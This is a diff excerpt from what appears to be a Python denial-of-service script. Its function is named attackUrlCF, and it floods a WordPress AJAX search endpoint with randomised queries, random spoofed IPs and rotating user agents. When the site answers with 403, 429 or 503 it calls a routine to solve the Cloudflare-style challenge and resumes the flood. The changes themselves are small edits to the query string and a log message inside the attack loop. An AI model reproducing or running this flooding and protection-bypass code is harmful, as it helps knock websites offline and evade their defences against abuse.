@@ -93,7 +93,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-			data = {'action':"b2c_ajax_search",'s':"sdfasdf" + str(random.randint(1,100000000))}
+			data = {'action':"b2c_ajax_search",'s':str(random.randint(1,100000000))}
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -121,7 +121,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			# print('threadNum: ' + str(threadNumber))
 			# print(res)
 			if str(res[0].status_code) in ['503', '403', '429']:
-				print(str(threadNumber), 'blocked!!!! resolsing chalennge', res[0].content)
+				print(str(threadNumber), 'blocked!!!! resolsing chalennge', res[0])
 				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 				print(str(threadNumber), 'resolved')
 			
